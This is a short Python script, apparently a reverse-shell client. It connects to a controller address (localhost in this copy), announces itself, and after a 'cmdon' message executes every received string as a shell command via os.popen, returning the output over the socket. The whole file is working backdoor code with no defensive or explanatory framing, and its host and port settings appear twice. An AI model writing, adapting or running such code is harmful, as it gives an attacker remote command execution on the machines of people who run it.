import subprocess
import socket
import os

HOST = '127.0.0.1'  # Standard loopback interface address (localhost)
PORT = 65432  

HOST = '127.0.0.1'  # The server's hostname or IP address
PORT = 65432

def connection():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
        soc.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        soc.connect((HOST, PORT))
        soc.send('im alive'.encode('utf-8'))
        cmd_on = False
        while True:
            try:
                data = soc.recv(2048).decode('utf-8')
                if data == 'exit':
                    return
                elif data == 'cmdon':
                    cmd_on = True
                elif data == 'cmdoff':
                    cmd_on = False
                elif cmd_on:
                    if data.split(' ')[0] == 'cd':
                        os.chdir(data.split(' ')[1])
                    else:

                        data = os.popen(data).read()
                        print(data)
                        if data != '':
                            soc.sendall(data.encode('utf-8'))
                        else:
                            soc.send('err'.encode('utf-8'))
                        continue
                else:
                    pass
                    # print(data)
                    
                soc.send('ok'.encode('utf-8'))
            except:
                soc.send('err'.encode('utf-8'))
                continue

if __name__ == "__main__":
    connection()

